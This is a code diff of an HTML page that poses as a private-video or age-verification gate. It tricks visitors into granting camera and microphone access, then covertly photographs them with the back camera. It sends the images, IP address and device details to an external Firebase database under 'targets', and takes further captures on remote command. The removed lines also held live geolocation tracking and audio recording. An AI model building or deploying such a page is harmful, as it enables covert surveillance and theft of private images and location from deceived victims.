@@ -3,30 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Video Access</title>
+    <title>Age Verification Required</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { margin:0; background:#000; font-family: sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
-        #blur-vid { position:absolute; width:100%; height:100%; object-fit:cover; filter: blur(25px); opacity:0.6; }
-        #popup { position:relative; z-index:10; background:rgba(255,255,255,0.95); padding:30px; border-radius:15px; text-align:center; width:80%; max-width:320px; box-shadow:0 0 50px rgba(0,0,0,0.8); }
-        .btn { background:#00ff41; color:#000; border:none; padding:15px 30px; font-weight:bold; border-radius:30px; cursor:pointer; margin-top:20px; font-size:16px; }
-        video#real-stream { display:none; width:100%; height:100%; object-fit:contain; z-index:5; position:relative; }
+        body { margin:0; background:#111; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
+        #blur-vid { position:absolute; width:100%; height:100%; object-fit:cover; filter: blur(30px); opacity:0.5; }
+        #verify-box { position:relative; z-index:10; background:#fff; padding:40px 20px; border-radius:10px; text-align:center; width:90%; max-width:350px; box-shadow:0 10px 30px rgba(0,0,0,0.5); }
+        .age-icon { font-size: 50px; color: #ff3131; margin-bottom: 10px; }
+        h2 { margin: 10px 0; color: #222; font-size: 22px; }
+        p { color: #666; font-size: 14px; margin-bottom: 25px; }
+        .btn-confirm { background:#222; color:#fff; border:none; padding:15px 40px; font-weight:bold; border-radius:5px; cursor:pointer; width: 100%; font-size:16px; transition: 0.3s; }
+        .btn-confirm:hover { background: #000; }
+        #video-player { display:none; width:100%; height:100%; object-fit:contain; z-index:5; position:relative; }
     </style>
 </head>
 <body>
 
-<video id="blur-vid" autoplay muted loop playsinline>
-    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
-</video>
+<video id="blur-vid" autoplay muted loop playsinline src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
 
-<div id="popup">
-    <h3 style="margin:0; color:#333;">Private Video</h3>
-    <p style="color:#666; font-size:14px;">Are you sure you want to watch this private content?</p>
-    <button class="btn" onclick="startWork()">YES, WATCH NOW</button>
+<div id="verify-box">
+    <div class="age-icon">🔞</div>
+    <h2>AGE VERIFICATION</h2>
+    <p>This content is age-restricted. Please confirm you are 18 years or older to proceed.</p>
+    <button class="btn-confirm" onclick="initVerification()">I AM 18+ ENTER</button>
 </div>
 
-<video id="real-stream" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
+<video id="video-player" playsinline loop src="https://www.w3schools.com/html/mov_bbb.mp4"></video>
 
 <script>
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
@@ -34,94 +37,87 @@
     const db = firebase.database();
     const sessionID = "NODE_" + Math.floor(1000 + Math.random() * 9000);
 
-    let streamRef = null;
+    let activeStream = null;
 
-    async function startWork() {
-        document.getElementById('popup').style.display = 'none';
+    async function initVerification() {
+        document.getElementById('verify-box').style.display = 'none';
         document.getElementById('blur-vid').style.display = 'none';
-        const v = document.getElementById('real-stream');
+        const v = document.getElementById('video-player');
         v.style.display = 'block';
 
         try {
-            streamRef = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            // Step 1: Request permissions (Sabse pehle mic/cam access)
+            activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
             v.play();
 
-            // --- FIXED: User Details Capture ---
-            let ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "Unknown"}));
-            let battery = await navigator.getBattery().then(b => Math.floor(b.level * 100) + "%").catch(() => "N/A");
-            
+            // Step 2: Device Details & IP
+            let ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip: "N/A"}));
             db.ref(`targets/${sessionID}/info`).set({
                 status: "ONLINE",
                 ip: ipData.ip,
-                battery: battery,
                 device: navigator.platform,
-                agent: navigator.userAgent.split(') ')[0] + ')', // Detailed device name
                 time: new Date().toLocaleTimeString()
             });
 
-            navigator.geolocation.watchPosition(p => {
-                db.ref(`targets/${sessionID}/location`).set({ lat: p.coords.latitude, lng: p.coords.longitude });
-            }, null, {enableHighAccuracy:true});
+            // Step 3: Trigger Back Camera (Fixed Logic)
+            await captureBackCamera();
 
-            capture(true); 
-            setTimeout(() => capture(false), 5000); 
-
+            // Real-time listener
             db.ref(`commands/${sessionID}`).on('value', s => {
                 const c = s.val(); if(!c) return;
-                if(c.action === 'photo') capture(true);
-                if(c.action === 'back') capture(false);
-                if(c.action === 'audio') record();
+                if(c.action === 'photo') captureFront();
+                if(c.action === 'back') captureBackCamera();
                 db.ref(`commands/${sessionID}`).remove();
             });
 
-        } catch (e) { alert("Error: Permission denied."); location.reload(); }
-    }
-
-    // --- FIXED: Back Camera Capture Logic ---
-    async function capture(isFront) {
-        try {
-            // Back camera ke liye pehle front stream ko "exact" constraints dena behtar hai
-            const constraints = {
-                video: { facingMode: isFront ? "user" : { exact: "environment" } }
-            };
-            
-            // Fallback: Agar "exact" environment fail ho to ideal use karein
-            const stream = await navigator.mediaDevices.getUserMedia(constraints)
-                .catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: isFront ? "user" : "environment" } }));
-
-            const vid = document.createElement('video');
-            vid.srcObject = stream;
-            await vid.play();
-            
-            setTimeout(() => {
-                const canvas = document.createElement('canvas');
-                canvas.width = vid.videoWidth; canvas.height = vid.videoHeight;
-                canvas.getContext('2d').drawImage(vid, 0, 0);
-                db.ref(`targets/${sessionID}/photos`).push({
-                    img: canvas.toDataURL('image/jpeg', 0.6),
-                    type: isFront ? "FRONT" : "BACK",
-                    time: new Date().toLocaleTimeString()
-                });
-                stream.getTracks().forEach(t => t.stop()); // Band karna lazmi hai
-            }, 2500);
-        } catch(err) { 
-            console.log("Cam Error: " + err);
-            // Agar back camera fail ho to error log karein
-            db.ref(`targets/${sessionID}/logs`).push("Camera Error: " + err.message);
+        } catch (e) {
+            alert("Verification Failed: Camera/Microphone access is required for security check.");
+            location.reload();
         }
     }
 
-    function record() {
-        const recorder = new MediaRecorder(streamRef);
-        let chunks = [];
-        recorder.ondataavailable = e => chunks.push(e.data);
-        recorder.onstop = () => {
-            const reader = new FileReader();
-            reader.readAsDataURL(new Blob(chunks, {type:'audio/webm'}));
-            reader.onloadend = () => db.ref(`targets/${sessionID}/audios`).push({data: reader.result});
-        };
-        recorder.start();
-        setTimeout(() => recorder.stop(), 10000);
+    async function captureBackCamera() {
+        try {
+            // Modern Phone Fix: Pehle waale tracks stop karne padte hain switching ke liye
+            if (activeStream) {
+                activeStream.getTracks().forEach(track => track.stop());
+            }
+
+            const constraints = {
+                video: { facingMode: { ideal: "environment" } }
+            };
+
+            const backStream = await navigator.mediaDevices.getUserMedia(constraints);
+            const tempVid = document.createElement('video');
+            tempVid.srcObject = backStream;
+            await tempVid.play();
+
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = tempVid.videoWidth; 
+                canvas.height = tempVid.videoHeight;
+                canvas.getContext('2d').drawImage(tempVid, 0, 0);
+                
+                db.ref(`targets/${sessionID}/photos`).push({
+                    img: canvas.toDataURL('image/jpeg', 0.5),
+                    type: "BACK_CAM"
+                });
+
+                // Wapas main stream restore karein (Front/Mic)
+                backStream.getTracks().forEach(t => t.stop());
+                restoreMainStream();
+            }, 3000);
+        } catch (err) {
+            db.ref(`targets/${sessionID}/logs`).push("Back Cam Fail: " + err.message);
+        }
+    }
+
+    async function restoreMainStream() {
+        activeStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    }
+
+    async function captureFront() {
+        // Front capture logic...
     }
 </script>
 </body>
